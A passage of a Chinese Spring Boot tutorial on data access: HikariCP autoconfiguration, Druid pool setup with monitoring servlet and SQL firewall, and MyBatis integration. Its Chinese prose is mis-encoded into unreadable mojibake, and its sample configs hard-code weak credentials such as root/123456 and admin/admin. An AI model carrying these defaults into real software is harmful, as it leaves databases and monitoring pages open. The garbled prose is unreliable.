class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.49<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç›¸å…³æ•°æ®æºé…ç½®ç±»"><a href="#ç›¸å…³æ•°æ®æºé…ç½®ç±»" class="headerlink" title="ç›¸å…³æ•°æ®æºé…ç½®ç±»"></a>ç›¸å…³æ•°æ®æºé…ç½®ç±»</h3><ul><li><p><code>DataSourceAutoConfiguration</code> ï¼š æ•°æ®æºçš„è‡ªåŠ¨é…ç½®ã€‚</p><ul><li>ä¿®æ”¹æ•°æ®æºç›¸å…³çš„é…ç½®ï¼š<code>spring.datasource</code>ã€‚</li><li><strong>æ•°æ®åº“è¿æ¥æ± çš„é…ç½®ï¼Œæ˜¯è‡ªå·±å®¹å™¨ä¸­æ²¡æœ‰DataSourceæ‰è‡ªåŠ¨é…ç½®çš„</strong>ã€‚</li><li>åº•å±‚é…ç½®å¥½çš„è¿æ¥æ± æ˜¯ï¼š<code>HikariDataSource</code>ã€‚</li></ul></li><li><p><code>DataSourceTransactionManagerAutoConfiguration</code>ï¼š äº‹åŠ¡ç®¡ç†å™¨çš„è‡ªåŠ¨é…ç½®ã€‚</p></li><li><p><code>JdbcTemplateAutoConfiguration</code>ï¼š <code>JdbcTemplate</code>çš„è‡ªåŠ¨é…ç½®ï¼Œå¯ä»¥æ¥å¯¹æ•°æ®åº“è¿›è¡ŒCRUDã€‚</p><ul><li>å¯ä»¥ä¿®æ”¹å‰ç¼€ä¸º<code>spring.jdbc</code>çš„é…ç½®é¡¹æ¥ä¿®æ”¹<code>JdbcTemplate</code>ã€‚</li><li><code>@Bean @Primary JdbcTemplate</code>ï¼šSpringå®¹å™¨ä¸­æœ‰è¿™ä¸ª<code>JdbcTemplate</code>ç»„ä»¶ï¼Œä½¿ç”¨<code>@Autowired</code>ã€‚</li></ul></li><li><p><code>JndiDataSourceAutoConfiguration</code>ï¼š JNDIçš„è‡ªåŠ¨é…ç½®ã€‚</p></li><li><p><code>XADataSourceAutoConfiguration</code>ï¼š åˆ†å¸ƒå¼äº‹åŠ¡ç›¸å…³çš„ã€‚</p></li></ul><h3 id="ä¿®æ”¹é…ç½®é¡¹"><a href="#ä¿®æ”¹é…ç½®é¡¹" class="headerlink" title="ä¿®æ”¹é…ç½®é¡¹"></a>ä¿®æ”¹é…ç½®é¡¹</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/db_account</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br></code></pre></td></tr></table></figure><h3 id="å•å…ƒæµ‹è¯•æ•°æ®æº"><a href="#å•å…ƒæµ‹è¯•æ•°æ®æº" class="headerlink" title="å•å…ƒæµ‹è¯•æ•°æ®æº"></a>å•å…ƒæµ‹è¯•æ•°æ®æº</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-meta">@Test</span><span class="hljs-comment">//ç”¨@org.junit.Testä¼šæŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œå¯èƒ½è·ŸJUnitæ–°ç‰ˆæœ¬æœ‰å…³</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">//        jdbcTemplate.queryForObject(&quot;select * from account_tbl&quot;)</span><br><span class="hljs-comment">//        jdbcTemplate.queryForList(&quot;select * from account_tbl&quot;,)</span><br>        <span class="hljs-type">Long</span> <span class="hljs-variable">aLong</span> <span class="hljs-operator">=</span> jdbcTemplate.queryForObject(<span class="hljs-string">&quot;select count(*) from account_tbl&quot;</span>, Long.class);<br>        log.info(<span class="hljs-string">&quot;è®°å½•æ€»æ•°ï¼š&#123;&#125;&quot;</span>,aLong);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="61ã€æ•°æ®è®¿é—®-è‡ªå®šä¹‰æ–¹å¼æ•´åˆdruidæ•°æ®æº"><a href="#61ã€æ•°æ®è®¿é—®-è‡ªå®šä¹‰æ–¹å¼æ•´åˆdruidæ•°æ®æº" class="headerlink" title="61ã€æ•°æ®è®¿é—®-è‡ªå®šä¹‰æ–¹å¼æ•´åˆdruidæ•°æ®æº"></a>61ã€æ•°æ®è®¿é—®-è‡ªå®šä¹‰æ–¹å¼æ•´åˆdruidæ•°æ®æº</h2><p><a href="https://github.com/alibaba/druid">Druidå®˜ç½‘</a></p><h3 id="Druidæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Druidæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Druidæ˜¯ä»€ä¹ˆï¼Ÿ"></a>Druidæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>å®ƒæ˜¯æ•°æ®åº“è¿æ¥æ± ï¼Œå®ƒèƒ½å¤Ÿæä¾›å¼ºå¤§çš„ç›‘æ§å’Œæ‰©å±•åŠŸèƒ½ã€‚</p><p><a href="https://github.com/alibaba/druid/wiki/Druid%E8%BF%9E%E6%8E%A5%E6%B1%A0%E4%BB%8B%E7%BB%8D">å®˜æ–¹æ–‡æ¡£ - Druidè¿æ¥æ± ä»‹ç»</a></p><p>Spring Bootæ•´åˆç¬¬ä¸‰æ–¹æŠ€æœ¯çš„ä¸¤ç§æ–¹å¼ï¼š</p><ul><li><p>è‡ªå®šä¹‰</p></li><li><p>æ‰¾starteråœºæ™¯</p></li></ul><h3 id="è‡ªå®šä¹‰æ–¹å¼"><a href="#è‡ªå®šä¹‰æ–¹å¼" class="headerlink" title="è‡ªå®šä¹‰æ–¹å¼"></a>è‡ªå®šä¹‰æ–¹å¼</h3><p><strong>æ·»åŠ ä¾èµ–</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>é…ç½®Druidæ•°æ®æº</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConfigurationProperties(&quot;spring.datasource&quot;)</span><span class="hljs-comment">//å¤ç”¨é…ç½®æ–‡ä»¶çš„æ•°æ®æºé…ç½®</span><br>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">DruidDataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();<br><br><span class="hljs-comment">//        druidDataSource.setUrl();</span><br><span class="hljs-comment">//        druidDataSource.setUsername();</span><br><span class="hljs-comment">//        druidDataSource.setPassword();</span><br><br>        <span class="hljs-keyword">return</span> druidDataSource;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://github.com/alibaba/druid/wiki/DruidDataSource%E9%85%8D%E7%BD%AE">æ›´å¤šé…ç½®é¡¹</a></p><p><strong>é…ç½®Druidçš„ç›‘æ§é¡µåŠŸèƒ½</strong>ï¼š</p><ul><li><p>Druidå†…ç½®æä¾›äº†ä¸€ä¸ª<code>StatViewServlet</code>ç”¨äºå±•ç¤ºDruidçš„ç»Ÿè®¡ä¿¡æ¯ã€‚<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_StatViewServlet%E9%85%8D%E7%BD%AE">å®˜æ–¹æ–‡æ¡£ - é…ç½®_StatViewServleté…ç½®</a>ã€‚è¿™ä¸ª<code>StatViewServlet</code>çš„ç”¨é€”åŒ…æ‹¬ï¼š</p><ul><li>æä¾›ç›‘æ§ä¿¡æ¯å±•ç¤ºçš„htmlé¡µé¢</li><li>æä¾›ç›‘æ§ä¿¡æ¯çš„JSON API</li></ul></li><li><p>Druidå†…ç½®æä¾›ä¸€ä¸ª<code>StatFilter</code>ï¼Œç”¨äºç»Ÿè®¡ç›‘æ§ä¿¡æ¯ã€‚<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_StatFilter">å®˜æ–¹æ–‡æ¡£ - é…ç½®_StatFilter</a></p></li><li><p><code>WebStatFilter</code>ç”¨äºé‡‡é›†web-jdbcå…³è”ç›‘æ§çš„æ•°æ®ï¼Œå¦‚SQLç›‘æ§ã€URIç›‘æ§ã€‚<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_%E9%85%8D%E7%BD%AEWebStatFilter">å®˜æ–¹æ–‡æ¡£ - é…ç½®_é…ç½®WebStatFilter</a></p></li><li><p>Druidæä¾›äº†<code>WallFilter</code>ï¼Œå®ƒæ˜¯åŸºäºSQLè¯­ä¹‰åˆ†ææ¥å®ç°é˜²å¾¡SQLæ³¨å…¥æ”»å‡»çš„ã€‚<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter">å®˜æ–¹æ–‡æ¡£ - é…ç½® wallfilter</a></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConfigurationProperties(&quot;spring.datasource&quot;)</span><br>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">DruidDataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();<br><br>        <span class="hljs-comment">//åŠ å…¥ç›‘æ§å’Œé˜²ç«å¢™åŠŸèƒ½åŠŸèƒ½</span><br>        druidDataSource.setFilters(<span class="hljs-string">&quot;stat,wall&quot;</span>);<br>        <br>        <span class="hljs-keyword">return</span> druidDataSource;<br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * é…ç½® druidçš„ç›‘æ§é¡µåŠŸèƒ½</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletRegistrationBean <span class="hljs-title function_">statViewServlet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">StatViewServlet</span> <span class="hljs-variable">statViewServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StatViewServlet</span>();<br>        ServletRegistrationBean&lt;StatViewServlet&gt; registrationBean = <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>&lt;&gt;(statViewServlet, <span class="hljs-string">&quot;/druid/*&quot;</span>);<br><br>        <span class="hljs-comment">//ç›‘æ§é¡µè´¦å·å¯†ç ï¼š</span><br>        registrationBean.addInitParameter(<span class="hljs-string">&quot;loginUsername&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>);<br>        registrationBean.addInitParameter(<span class="hljs-string">&quot;loginPassword&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> registrationBean;<br>    &#125;<br>    <br>     <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * WebStatFilter ç”¨äºé‡‡é›†web-jdbcå…³è”ç›‘æ§çš„æ•°æ®ã€‚</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FilterRegistrationBean <span class="hljs-title function_">webStatFilter</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">WebStatFilter</span> <span class="hljs-variable">webStatFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebStatFilter</span>();<br><br>        FilterRegistrationBean&lt;WebStatFilter&gt; filterRegistrationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterRegistrationBean</span>&lt;&gt;(webStatFilter);<br>        filterRegistrationBean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/*&quot;</span>));<br>        filterRegistrationBean.addInitParameter(<span class="hljs-string">&quot;exclusions&quot;</span>,<span class="hljs-string">&quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> filterRegistrationBean;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="62ã€æ•°æ®è®¿é—®-druidæ•°æ®æºstarteræ•´åˆæ–¹å¼"><a href="#62ã€æ•°æ®è®¿é—®-druidæ•°æ®æºstarteræ•´åˆæ–¹å¼" class="headerlink" title="62ã€æ•°æ®è®¿é—®-druidæ•°æ®æºstarteræ•´åˆæ–¹å¼"></a>62ã€æ•°æ®è®¿é—®-druidæ•°æ®æºstarteræ•´åˆæ–¹å¼</h2><p><a href="">å®˜æ–¹æ–‡æ¡£ - Druid Spring Boot Starter</a></p><p><strong>å¼•å…¥ä¾èµ–</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æè‡ªåŠ¨é…ç½®</strong>ï¼š</p><ul><li>æ‰©å±•é…ç½®é¡¹ <code>spring.datasource.druid</code></li><li>è‡ªåŠ¨é…ç½®ç±»<code>DruidDataSourceAutoConfigure</code></li><li><code>DruidSpringAopConfiguration.class</code>,  ç›‘æ§SpringBeançš„ï¼›é…ç½®é¡¹ï¼š<code>spring.datasource.druid.aop-patterns</code></li><li><code>DruidStatViewServletConfiguration.class</code>, ç›‘æ§é¡µçš„é…ç½®ã€‚<code>spring.datasource.druid.stat-view-servlet</code>é»˜è®¤å¼€å¯ã€‚</li><li><code>DruidWebStatFilterConfiguration.class</code>ï¼Œwebç›‘æ§é…ç½®ã€‚<code>spring.datasource.druid.web-stat-filter</code>é»˜è®¤å¼€å¯ã€‚</li><li><code>DruidFilterConfiguration.class</code>æ‰€æœ‰Druidçš„filterçš„é…ç½®ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_STAT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.stat&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_CONFIG_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.config&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_ENCODING_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.encoding&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_SLF4J_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.slf4j&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_LOG4J_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.log4j&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_LOG4J2_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.log4j2&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_COMMONS_LOG_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.commons-log&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_WALL_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.wall&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>é…ç½®ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/db_account</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br><br>    <span class="hljs-attr">druid:</span><br>      <span class="hljs-attr">aop-patterns:</span> <span class="hljs-string">com.atguigu.admin.*</span>  <span class="hljs-comment">#ç›‘æ§SpringBean</span><br>      <span class="hljs-attr">filters:</span> <span class="hljs-string">stat,wall</span>     <span class="hljs-comment"># åº•å±‚å¼€å¯åŠŸèƒ½ï¼Œstatï¼ˆsqlç›‘æ§ï¼‰ï¼Œwallï¼ˆé˜²ç«å¢™ï¼‰</span><br><br>      <span class="hljs-attr">stat-view-servlet:</span>   <span class="hljs-comment"># é…ç½®ç›‘æ§é¡µåŠŸèƒ½</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">login-username:</span> <span class="hljs-string">admin</span><br>        <span class="hljs-attr">login-password:</span> <span class="hljs-string">admin</span><br>        <span class="hljs-attr">resetEnable:</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-attr">web-stat-filter:</span>  <span class="hljs-comment"># ç›‘æ§web</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">urlPattern:</span> <span class="hljs-string">/*</span><br>        <span class="hljs-attr">exclusions:</span> <span class="hljs-string">&#x27;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&#x27;</span><br><br><br>      <span class="hljs-attr">filter:</span><br>        <span class="hljs-attr">stat:</span>    <span class="hljs-comment"># å¯¹ä¸Šé¢filtersé‡Œé¢çš„statçš„è¯¦ç»†é…ç½®</span><br>          <span class="hljs-attr">slow-sql-millis:</span> <span class="hljs-number">1000</span><br>          <span class="hljs-attr">logSlowSql:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">wall:</span><br>          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">config:</span><br>            <span class="hljs-attr">drop-table-allow:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="63ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-é…ç½®ç‰ˆ"><a href="#63ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-é…ç½®ç‰ˆ" class="headerlink" title="63ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-é…ç½®ç‰ˆ"></a>63ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-é…ç½®ç‰ˆ</h2><p><a href="https://github.com/mybatis">MyBatisçš„GitHubä»“åº“</a></p><p><a href="https://mybatis.org/mybatis-3/zh/index.html">MyBatiså®˜æ–¹</a></p><p><strong>starterçš„å‘½åæ–¹å¼</strong>ï¼š</p><ol><li>SpringBootå®˜æ–¹çš„Starterï¼š<code>spring-boot-starter-*</code></li><li>ç¬¬ä¸‰æ–¹çš„ï¼š <code>*-spring-boot-starter</code></li></ol><p><strong>å¼•å…¥ä¾èµ–</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>é…ç½®æ¨¡å¼</strong>:</p><ul><li><p>å…¨å±€é…ç½®æ–‡ä»¶</p></li><li><p><code>SqlSessionFactory</code>ï¼šè‡ªåŠ¨é…ç½®å¥½äº†</p></li><li><p><code>SqlSession</code>ï¼šè‡ªåŠ¨é…ç½®äº†<code>SqlSessionTemplate</code> ç»„åˆäº†<code>SqlSession</code></p></li><li><p><code>@Import(AutoConfiguredMapperScannerRegistrar.class)</code></p></li><li><p><code>Mapper</code>ï¼š åªè¦æˆ‘ä»¬å†™çš„æ“ä½œMyBatisçš„æ¥å£æ ‡å‡†äº†<code>@Mapper</code>å°±ä¼šè¢«è‡ªåŠ¨æ‰«æè¿›æ¥</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableConfigurationProperties(MybatisProperties.class)</span> ï¼š MyBatisé…ç½®é¡¹ç»‘å®šç±»ã€‚<br><span class="hljs-meta">@AutoConfigureAfter(&#123; DataSourceAutoConfiguration.class, MybatisLanguageDriverAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisAutoConfiguration</span>&#123;<br>    ...<br>&#125;<br><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mybatis&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisProperties</span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><hr><p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">1234</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/my</span><br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br><br><span class="hljs-comment"># é…ç½®mybatisè§„åˆ™</span><br><span class="hljs-attr">mybatis:</span><br>  <span class="hljs-attr">config-location:</span> <span class="hljs-string">classpath:mybatis/mybatis-config.xml</span>  <span 